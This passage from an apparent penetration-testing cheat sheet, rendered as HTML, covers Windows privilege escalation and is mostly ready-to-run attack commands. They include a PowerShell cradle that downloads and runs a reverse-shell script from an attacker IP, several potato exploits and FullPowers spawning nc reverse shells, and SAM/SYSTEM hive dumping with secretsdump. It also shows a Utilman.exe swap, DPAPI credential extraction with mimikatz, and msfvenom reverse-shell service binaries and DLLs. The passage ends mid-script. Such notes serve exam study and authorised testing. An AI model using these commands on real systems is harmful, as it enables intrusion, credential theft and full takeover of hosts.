</span><span id="__span-56-13"><a id="__codelineno-56-13" name="__codelineno-56-13" href="#__codelineno-56-13"></a><span class="c"># Recommended to connect that user from attacking machine using evil-winrm</span>
</span><span id="__span-56-14"><a id="__codelineno-56-14" name="__codelineno-56-14" href="#__codelineno-56-14"></a>
</span><span id="__span-56-15"><a id="__codelineno-56-15" name="__codelineno-56-15" href="#__codelineno-56-15"></a><span class="c"># after having creds, can get back reverse shell having high privs</span>
</span><span id="__span-56-16"><a id="__codelineno-56-16" name="__codelineno-56-16" href="#__codelineno-56-16"></a><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="s2">&quot;powershell&quot;</span> <span class="n">-argumentlist</span> <span class="s2">&quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://192.168.45.194/revshell.ps1&#39;)&quot;</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
</span><span id="__span-56-17"><a id="__codelineno-56-17" name="__codelineno-56-17" href="#__codelineno-56-17"></a>
</span><span id="__span-56-18"><a id="__codelineno-56-18" name="__codelineno-56-18" href="#__codelineno-56-18"></a><span class="c"># shell-admin.ps1</span>
</span><span id="__span-56-19"><a id="__codelineno-56-19" name="__codelineno-56-19" href="#__codelineno-56-19"></a><span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">14</span><span class="p">.</span><span class="n">7</span> <span class="n">-Port</span> <span class="n">6666</span>
</span></code></pre></div>
<h4 id="misconfiguredexcessive-privileges">Misconfigured/Excessive Privileges</h4>
<h5 id="seimpersonateprivilege-potato-attacks">SeImpersonatePrivilege (Potato Attacks)</h5>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a><span class="c"># POTATO Attacks</span>
</span><span id="__span-57-2"><a id="__codelineno-57-2" name="__codelineno-57-2" href="#__codelineno-57-2"></a><span class="c"># SeImpersonatePrivilege OR SeAssignPrimaryTokenPrivilege</span>
</span><span id="__span-57-3"><a id="__codelineno-57-3" name="__codelineno-57-3" href="#__codelineno-57-3"></a><span class="p">.\</span><span class="n">SigmaPotato</span><span class="p">.</span><span class="n">exe</span> <span class="p">&lt;</span><span class="n">cmd</span><span class="p">&gt;/-</span><span class="n">-revshell</span> <span class="p">&lt;</span><span class="n">ip</span><span class="p">&gt;</span> <span class="p">&lt;</span><span class="n">port</span><span class="p">&gt;</span>  <span class="c"># [github repo](https://github.com/tylerdotrar/SigmaPotato)</span>
</span><span id="__span-57-4"><a id="__codelineno-57-4" name="__codelineno-57-4" href="#__codelineno-57-4"></a><span class="p">.\</span><span class="n">PrintSpoofer64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="n">-c</span> <span class="n">powershell</span>
</span><span id="__span-57-5"><a id="__codelineno-57-5" name="__codelineno-57-5" href="#__codelineno-57-5"></a><span class="p">.\</span><span class="n">godpotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-cmd</span> <span class="s2">&quot;cmd /c systeminfo&quot;</span>
</span><span id="__span-57-6"><a id="__codelineno-57-6" name="__codelineno-57-6" href="#__codelineno-57-6"></a><span class="p">.\</span><span class="n">juicypotato</span><span class="p">.</span><span class="n">exe</span> <span class="n">-t</span> <span class="p">*</span> <span class="n">-p</span> <span class="n">rev</span><span class="p">.</span><span class="n">exe</span> <span class="n">-l</span> <span class="n">4444</span> <span class="c"># any unoccupied port on victim</span>
</span><span id="__span-57-7"><a id="__codelineno-57-7" name="__codelineno-57-7" href="#__codelineno-57-7"></a><span class="c"># rogue potatoe</span>
</span><span id="__span-57-8"><a id="__codelineno-57-8" name="__codelineno-57-8" href="#__codelineno-57-8"></a><span class="n">rogue</span><span class="p">.</span><span class="n">exe</span> <span class="n">-r</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">154</span> <span class="n">-e</span> <span class="s2">&quot;C:\services\nc.exe 192.168.45.154 4455 -e cmd.exe&quot;</span> <span class="n">-l</span> <span class="n">9999</span> <span class="c"># victim</span>
</span><span id="__span-57-9"><a id="__codelineno-57-9" name="__codelineno-57-9" href="#__codelineno-57-9"></a><span class="n">sudo</span> <span class="n">socat</span> <span class="n">tcp-listen</span><span class="p">:</span><span class="n">135</span><span class="p">,</span><span class="n">reuseaddr</span><span class="p">,</span><span class="n">fork</span> <span class="n">tcp</span><span class="p">:</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">181</span><span class="p">.</span><span class="n">222</span><span class="p">:</span><span class="n">9999</span>
</span><span id="__span-57-10"><a id="__codelineno-57-10" name="__codelineno-57-10" href="#__codelineno-57-10"></a>
</span><span id="__span-57-11"><a id="__codelineno-57-11" name="__codelineno-57-11" href="#__codelineno-57-11"></a><span class="c"># sometimes potato attacks doesn&#39;t return output then try to create new user</span>
</span><span id="__span-57-12"><a id="__codelineno-57-12" name="__codelineno-57-12" href="#__codelineno-57-12"></a><span class="c"># RottenPotato, SweetPotato, , JuicyPotato or Godpotato [ALL POTATOES](https://github.com/AtvikSecurity/CentralizedPotatoes)</span>
</span></code></pre></div>
<h6 id="local-service-account-with-no-seimpersonate">Local Service Account with no SeImpersonate</h6>
<p>Explanation of this attack: <a href="https://itm4n.github.io/localservice-privileges/?source=post_page-----b95d3146cfe9---------------------------------------">Give me back my privileges</a></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="n">whoami</span>  
</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="c"># nt authority\local service </span>
</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="c"># and not having SeImpersonate then use the [FullPowers](https://github.com/itm4n/FullPowers)</span>
</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="n">Fullpowers</span><span class="p">.</span><span class="n">exe</span> 
</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a><span class="n">Fullpowers</span><span class="p">.</span><span class="n">exe</span> <span class="n">-x</span>
</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a><span class="n">FullPowers</span><span class="p">.</span><span class="n">exe</span> <span class="n">-c</span> <span class="s2">&quot;C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd&quot;</span> <span class="n">-z</span>
</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a>
</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a><span class="c"># In order to shift to another process</span>
</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a><span class="n">RunFromProcess-x64</span><span class="p">.</span><span class="n">exe</span> <span class="n">3636</span> <span class="s2">&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;</span> <span class="n">-ep</span> <span class="n">Bypass</span> <span class="n">-Command</span> <span class="s2">&quot;. C:\TOOLS\powercat.ps1;powercat -l -p 7001 -ep&quot;</span>
</span></code></pre></div>
<h5 id="sebackupprivilege">SeBackupPrivilege</h5>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="c"># if SeBackupPrivilege Permissions then</span>
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="c"># Dump SAM, SYSTEM and SECURITY hive</span>
</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SAM</span> <span class="n">sam</span><span class="p">.</span><span class="n">bak</span>
</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span>
</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SECURITY</span> <span class="n">security</span><span class="p">.</span><span class="n">bak</span>
</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a><span class="n">impacket-secretsdump</span> <span class="n">-sam</span> <span class="n">sam</span><span class="p">.</span><span class="n">bak</span> <span class="n">-system</span> <span class="n">system</span><span class="p">.</span><span class="n">bak</span> <span class="n">-security</span> <span class="n">security</span><span class="p">.</span><span class="n">bak</span> <span class="n">LOCAL</span>
</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a><span class="n">impacket-secretsdump</span> <span class="n">-system</span> <span class="n">SYSTEM</span> <span class="n">-sam</span> <span class="n">SAM</span> <span class="n">LOCAL</span>
</span><span id="__span-59-8"><a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a>
</span><span id="__span-59-9"><a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a><span class="n">pypykatz</span> <span class="n">registry</span>  <span class="p">-</span><span class="n">-sam</span> <span class="n">SAM</span> <span class="p">-</span><span class="n">-system</span> <span class="n">SYSTEM</span>
</span></code></pre></div>
<h5 id="serestoreprivilege">SeRestorePrivilege</h5>
<p>Using that we can replace any binary we want
<div class="language-shell highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a><span class="c1"># If we have RDP, then we can replace Utilman.exe and then press Win + U to trigger that binary during our RDP session </span>
</span><span id="__span-60-2"><a id="__codelineno-60-2" name="__codelineno-60-2" href="#__codelineno-60-2"></a><span class="nb">cd</span><span class="w"> </span>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32<span class="w">  </span>
</span><span id="__span-60-3"><a id="__codelineno-60-3" name="__codelineno-60-3" href="#__codelineno-60-3"></a>ren<span class="w"> </span>Utilman.exe<span class="w"> </span>Utilman.old<span class="w">  </span>
</span><span id="__span-60-4"><a id="__codelineno-60-4" name="__codelineno-60-4" href="#__codelineno-60-4"></a>ren<span class="w"> </span>cmd.exe<span class="w"> </span>Utilman.exe
</span></code></pre></div></p>
<h5 id="semanagevolumeprivilege">SeManageVolumePrivilege</h5>
<div class="language-Powershell highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a><span class="c"># [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit) gives acces to complete C:\ drive</span>
</span><span id="__span-61-2"><a id="__codelineno-61-2" name="__codelineno-61-2" href="#__codelineno-61-2"></a>
</span><span id="__span-61-3"><a id="__codelineno-61-3" name="__codelineno-61-3" href="#__codelineno-61-3"></a><span class="c"># Now we can try hijacking any DLL or any other vector of file replacement or missing dll</span>
</span><span id="__span-61-4"><a id="__codelineno-61-4" name="__codelineno-61-4" href="#__codelineno-61-4"></a><span class="c"># METHOD 1</span>
</span><span id="__span-61-5"><a id="__codelineno-61-5" name="__codelineno-61-5" href="#__codelineno-61-5"></a><span class="c"># [WerTrigger](https://github.com/sailay1996/WerTrigger) to get full privilege NT Authority System access </span>
</span><span id="__span-61-6"><a id="__codelineno-61-6" name="__codelineno-61-6" href="#__codelineno-61-6"></a><span class="c"># After running it won&#39;t return any output or anything so type command to get back stable interactive connection </span>
</span><span id="__span-61-7"><a id="__codelineno-61-7" name="__codelineno-61-7" href="#__codelineno-61-7"></a><span class="n">c</span><span class="p">:\</span><span class="n">xampp</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">244</span> <span class="n">9999</span> <span class="n">-e</span> <span class="n">powershell</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-61-8"><a id="__codelineno-61-8" name="__codelineno-61-8" href="#__codelineno-61-8"></a>
</span><span id="__span-61-9"><a id="__codelineno-61-9" name="__codelineno-61-9" href="#__codelineno-61-9"></a><span class="c"># METHOD 2</span>
</span><span id="__span-61-10"><a id="__codelineno-61-10" name="__codelineno-61-10" href="#__codelineno-61-10"></a><span class="c"># Replace the below dll with the malicious one</span>
</span><span id="__span-61-11"><a id="__codelineno-61-11" name="__codelineno-61-11" href="#__codelineno-61-11"></a><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">wbem</span><span class="p">\</span><span class="n">tzres</span><span class="p">.</span><span class="n">dll</span>
</span><span id="__span-61-12"><a id="__codelineno-61-12" name="__codelineno-61-12" href="#__codelineno-61-12"></a><span class="c"># then call systeminfo to trigger it</span>
</span><span id="__span-61-13"><a id="__codelineno-61-13" name="__codelineno-61-13" href="#__codelineno-61-13"></a><span class="n">systeminfo</span>
</span></code></pre></div>
<h5 id="semachineaccountprivilege">SeMachineAccountPrivilege</h5>
<p>Windows Privilege Escalation: sAMAccountName Spoofing specfici version of windows</p>
<h4 id="group-privileges">Group Privileges</h4>
<p>https://github.com/dollarboysushil/oscp-cpts-notes/tree/main/windows-privilege-escalation/group-privileges</p>
<h5 id="server-operator-group">Server operator group</h5>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>accesschk.exe<span class="w"> </span>-cuwqv<span class="w"> </span><span class="s2">&quot;molly.smith&quot;</span><span class="w"> </span>*<span class="w"> </span>/accepteula
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="c1"># we can change the binPath of any service</span>
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a>sc<span class="w"> </span>config<span class="w"> </span>VMTools<span class="w"> </span><span class="nv">binPath</span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;cmd /c net localgroup administrators user /add&quot;</span>
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a>
</span><span id="__span-62-5"><a id="__codelineno-62-5" name="__codelineno-62-5" href="#__codelineno-62-5"></a><span class="c1"># we can make backup of SAM and SYSTEM too</span>
</span></code></pre></div>
<table>
<thead>
<tr>
<th><strong>Group</strong></th>
<th><strong>Scope &amp; Type</strong></th>
<th><strong>Key Permissions / Rights</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Enterprise Admins</strong></td>
<td>Forest‑wide, Universal (root domain)</td>
<td>Full control over all domains, can modify forest &amp; cross-domain settings (<a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory?utm_source=chatgpt.com" title="Active Directory Privileged Accounts and Groups Guide">Microsoft Learn</a>, <a href="https://ss64.com/nt/syntax-security_groups.html?utm_source=chatgpt.com" title="Windows Built-in Users, Default Groups and Special Identities - SS64">SS64</a>)</td>
</tr>
<tr>
<td><strong>Domain Admins</strong></td>
<td>Domain-wide, Global</td>
<td>Local admin on all domain‑joined machines, full control on domain objects</td>
</tr>
<tr>
<td><strong>Administrators (Built-in)</strong></td>
<td>Domain local</td>
<td>Full control on DCs and domain objects; can take ownership</td>
</tr>
<tr>
<td><strong>Schema Admins</strong></td>
<td>Forest root, Universal</td>
<td>Modify AD schema definition</td>
</tr>
<tr>
<td><strong>Account Operators</strong></td>
<td>Domain local</td>
<td>Create/manage user &amp; group accounts; network access; workstation joins</td>
</tr>
<tr>
<td><strong>Backup Operators</strong></td>
<td>Domain local</td>
<td>Backup/restore files and directories on DCs; bypass traverse checking</td>
</tr>
<tr>
<td><strong>Print Operators</strong></td>
<td>Domain local</td>
<td>Manage print queues on DCs</td>
</tr>
<tr>
<td><strong>Server Operators</strong></td>
<td>Domain local</td>
<td>Manage DC roles: log on locally, start/stop services, backup/restore</td>
</tr>
<tr>
<td><strong>Domain Controllers</strong></td>
<td>Global</td>
<td>Identifies all DCs; used in GPO targeting; can log in locally/network</td>
</tr>
<tr>
<td><strong>Domain Users</strong></td>
<td>Global</td>
<td>All domain user accounts; standard user privileges</td>
</tr>
<tr>
<td><strong>Domain Computers</strong></td>
<td>Global</td>
<td>All member computers; no special rights</td>
</tr>
<tr>
<td><strong>Enterprise Key Admins</strong></td>
<td>Forest-wide, Universal</td>
<td>Manage forest-level encryption keys</td>
</tr>
<tr>
<td><strong>Read-only Domain Controllers</strong></td>
<td>Global</td>
<td>Membership grants read-only DC functionality; no write rights</td>
</tr>
</tbody>
</table>
<p><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups">Microsoft Active Directory Security Groups Documentation</a></p>
<h4 id="secrets-extraction-using-dpapi">Secrets extraction using DPAPI</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a><span class="c"># secrets extraction using DPAPI</span>
</span><span id="__span-63-2"><a id="__codelineno-63-2" name="__codelineno-63-2" href="#__codelineno-63-2"></a><span class="p">.\</span><span class="n">sharpdpapi</span><span class="p">.</span><span class="n">exe</span> <span class="n">masterkeys</span> <span class="p">/</span><span class="n">target</span><span class="p">:&lt;</span><span class="n">dpapi_master_key_location</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">pass</span> <span class="p">/</span><span class="n">sid</span><span class="p">:&lt;</span><span class="n">sid</span><span class="p">&gt;</span> <span class="c"># to decrypt DPAPI masterkey</span>
</span><span id="__span-63-3"><a id="__codelineno-63-3" name="__codelineno-63-3" href="#__codelineno-63-3"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">dpapi</span>  <span class="c"># mimiaktz to extract decrypted DPAPI keys</span>
</span><span id="__span-63-4"><a id="__codelineno-63-4" name="__codelineno-63-4" href="#__codelineno-63-4"></a><span class="n">dpapi</span><span class="p">::</span><span class="n">masterkey</span>
</span><span id="__span-63-5"><a id="__codelineno-63-5" name="__codelineno-63-5" href="#__codelineno-63-5"></a><span class="n">SharpDPAPI</span> <span class="n">blob</span> <span class="p">/</span><span class="k">in</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\&lt;</span><span class="n">user</span><span class="p">&gt;\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Local</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Credentials</span><span class="p">\</span><span class="n">XYZ</span> <span class="p">/</span><span class="n">masterkey</span><span class="p">:&lt;</span><span class="n">hex</span><span class="p">&gt;</span>  <span class="c"># to decrypt credentials file storing secrets</span>
</span></code></pre></div>
<h4 id="privesc-thru-service">PrivEsc Thru SERVICE</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a><span class="c"># 1. Service Binary Hijacking</span>
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">exec</span> <span class="n">CMD</span><span class="p">=</span><span class="s1">&#39;net localgroup administrators user /add&#39;</span> <span class="o">-f</span> <span class="n">exe-service</span> <span class="n">-o</span> <span class="n">common</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">155</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4422</span> <span class="o">-f</span> <span class="n">exe-service</span> <span class="p">&gt;</span> <span class="n">serv4422</span><span class="p">.</span><span class="n">exe</span>                  
</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a><span class="c"># Or compile your own using the Windows Service C boilerplate ( [[Code &amp; Exploit Cheatsheet#Windows Service C code]] )</span>
</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>
</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a><span class="c"># 2. Service Escalation via Registry &amp; Permissions</span>
</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a><span class="c"># Enumerate ACLs on service registry keys</span>
</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a><span class="nb">Get-Acl</span> <span class="n">-Path</span> <span class="n">HKLM</span><span class="p">:\</span><span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\*</span> <span class="p">|</span> <span class="nb">Format-List</span>
</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a><span class="c"># If you have FullControl on a target service (&#39;svc_name&#39;):</span>
</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\</span><span class="n">svc_name</span> <span class="p">/</span><span class="n">v</span> <span class="n">ImagePath</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_EXPAND_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="n">C</span><span class="p">:\</span><span class="n">Temp</span><span class="p">\</span><span class="n">common</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">f</span>
</span><span id="__span-64-11"><a id="__codelineno-64-11" name="__codelineno-64-11" href="#__codelineno-64-11"></a><span class="nb">sc start </span><span class="n">svc_name</span>
</span><span id="__span-64-12"><a id="__codelineno-64-12" name="__codelineno-64-12" href="#__codelineno-64-12"></a><span class="c"># This re-registers the service to run your binary as SYSTEM.</span>
</span><span id="__span-64-13"><a id="__codelineno-64-13" name="__codelineno-64-13" href="#__codelineno-64-13"></a>
</span><span id="__span-64-14"><a id="__codelineno-64-14" name="__codelineno-64-14" href="#__codelineno-64-14"></a><span class="c"># 3. Service Escalation via binpath change</span>
</span><span id="__span-64-15"><a id="__codelineno-64-15" name="__codelineno-64-15" href="#__codelineno-64-15"></a><span class="c"># Requires SERVICE_CHANGE_CONFIG permission</span>
</span><span id="__span-64-16"><a id="__codelineno-64-16" name="__codelineno-64-16" href="#__codelineno-64-16"></a><span class="nb">sc </span><span class="n">config</span> <span class="n">svc_name</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&quot;\&quot;</span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">net</span><span class="p">.</span><span class="n">exe</span><span class="p">\</span><span class="s2">&quot; localgroup administrators user /add&quot;</span>
</span><span id="__span-64-17"><a id="__codelineno-64-17" name="__codelineno-64-17" href="#__codelineno-64-17"></a><span class="nb">sc start </span><span class="n">svc_name</span>
</span><span id="__span-64-18"><a id="__codelineno-64-18" name="__codelineno-64-18" href="#__codelineno-64-18"></a>
</span><span id="__span-64-19"><a id="__codelineno-64-19" name="__codelineno-64-19" href="#__codelineno-64-19"></a><span class="c"># 4. DLL Hijacking of a Service</span>
</span><span id="__span-64-20"><a id="__codelineno-64-20" name="__codelineno-64-20" href="#__codelineno-64-20"></a><span class="c"># Determine if the target service loads any DLL via an unqualified path check [[#Windows Services]]</span>
</span><span id="__span-64-21"><a id="__codelineno-64-21" name="__codelineno-64-21" href="#__codelineno-64-21"></a><span class="c"># If service is 64-bit, use a 64-bit payload:</span>
</span><span id="__span-64-22"><a id="__codelineno-64-22" name="__codelineno-64-22" href="#__codelineno-64-22"></a><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">x64</span><span class="p">/</span><span class="n">shell_reverse_tcp</span> <span class="n">LHOST</span><span class="p">=</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">155</span> <span class="n">LPORT</span><span class="p">=</span><span class="n">4422</span> <span class="o">-f</span> <span class="n">dll</span> <span class="n">-o</span> <span class="n">mal4422x64</span><span class="p">.</span><span class="n">dll</span>
</span><span id="__span-64-23"><a id="__codelineno-64-23" name="__codelineno-64-23" href="#__codelineno-64-23"></a>
</span><span id="__span-64-24"><a id="__codelineno-64-24" name="__codelineno-64-24" href="#__codelineno-64-24"></a><span class="c"># Drop the DLL into a directory earlier in the search order than the legitimate DLL’s location.</span>
</span><span id="__span-64-25"><a id="__codelineno-64-25" name="__codelineno-64-25" href="#__codelineno-64-25"></a><span class="c"># DLL search order (LoadLibrary):  </span>
</span><span id="__span-64-26"><a id="__codelineno-64-26" name="__codelineno-64-26" href="#__codelineno-64-26"></a><span class="c"># 1. Service executable directory  </span>
</span><span id="__span-64-27"><a id="__codelineno-64-27" name="__codelineno-64-27" href="#__codelineno-64-27"></a><span class="c"># 2. System directory (System32)  </span>
</span><span id="__span-64-28"><a id="__codelineno-64-28" name="__codelineno-64-28" href="#__codelineno-64-28"></a><span class="c"># 3. 16-bit system dir  </span>
</span><span id="__span-64-29"><a id="__codelineno-64-29" name="__codelineno-64-29" href="#__codelineno-64-29"></a><span class="c"># 4. Windows dir  </span>
</span><span id="__span-64-30"><a id="__codelineno-64-30" name="__codelineno-64-30" href="#__codelineno-64-30"></a><span class="c"># 5. Current working directory  </span>
</span><span id="__span-64-31"><a id="__codelineno-64-31" name="__codelineno-64-31" href="#__codelineno-64-31"></a><span class="c"># 6. Directories in %PATH%  :contentReference[oaicite:1]{index=1}</span>
</span><span id="__span-64-32"><a id="__codelineno-64-32" name="__codelineno-64-32" href="#__codelineno-64-32"></a>
</span><span id="__span-64-33"><a id="__codelineno-64-33" name="__codelineno-64-33" href="#__codelineno-64-33"></a><span class="c"># Variants:</span>
</span><span id="__span-64-34"><a id="__codelineno-64-34" name="__codelineno-64-34" href="#__codelineno-64-34"></a><span class="c"># • Relative-path hijacking: place exe+DLL in writable location  </span>
</span><span id="__span-64-35"><a id="__codelineno-64-35" name="__codelineno-64-35" href="#__codelineno-64-35"></a><span class="c"># • Phantom-hijacking: drop DLL matching a missing dependency  </span>
</span><span id="__span-64-36"><a id="__codelineno-64-36" name="__codelineno-64-36" href="#__codelineno-64-36"></a><span class="c"># • DLL redirection via manifest or .local files :contentReference[oaicite:2]{index=2}</span>
</span><span id="__span-64-37"><a id="__codelineno-64-37" name="__codelineno-64-37" href="#__codelineno-64-37"></a>
</span><span id="__span-64-38"><a id="__codelineno-64-38" name="__codelineno-64-38" href="#__codelineno-64-38"></a><span class="c"># To detect vulnerable services:</span>
</span><span id="__span-64-39"><a id="__codelineno-64-39" name="__codelineno-64-39" href="#__codelineno-64-39"></a><span class="c"># - Use ProcMon to catch missing DLL load attempts  </span>
</span><span id="__span-64-40"><a id="__codelineno-64-40" name="__codelineno-64-40" href="#__codelineno-64-40"></a><span class="c"># - Look for insecure ACLs on service registry or executable directories</span>
</span><span id="__span-64-41"><a id="__codelineno-64-41" name="__codelineno-64-41" href="#__codelineno-64-41"></a>
</span><span id="__span-64-42"><a id="__codelineno-64-42" name="__codelineno-64-42" href="#__codelineno-64-42"></a>
</span><span id="__span-64-43"><a id="__codelineno-64-43" name="__codelineno-64-43" href="#__codelineno-64-43"></a><span class="c"># Find Writable Location</span>
</span><span id="__span-64-44"><a id="__codelineno-64-44" name="__codelineno-64-44" href="#__codelineno-64-44"></a><span class="nv">$WritableDirectory</span> <span class="p">=</span> <span class="nv">$null</span>
</span><span id="__span-64-45"><a id="__codelineno-64-45" name="__codelineno-64-45" href="#__codelineno-64-45"></a><span class="nv">$Path</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment&quot;</span> <span class="n">-Name</span> <span class="s2">&quot;PATH&quot;</span><span class="p">).</span><span class="n">path</span>
</span><span id="__span-64-46"><a id="__codelineno-64-46" name="__codelineno-64-46" href="#__codelineno-64-46"></a><span class="nv">$Path</span> <span class="n">-Split</span> <span class="s2">&quot;;&quot;</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span>
</span><span id="__span-64-47"><a id="__codelineno-64-47" name="__codelineno-64-47" href="#__codelineno-64-47"></a>    <span class="k">try</span> <span class="p">{</span>
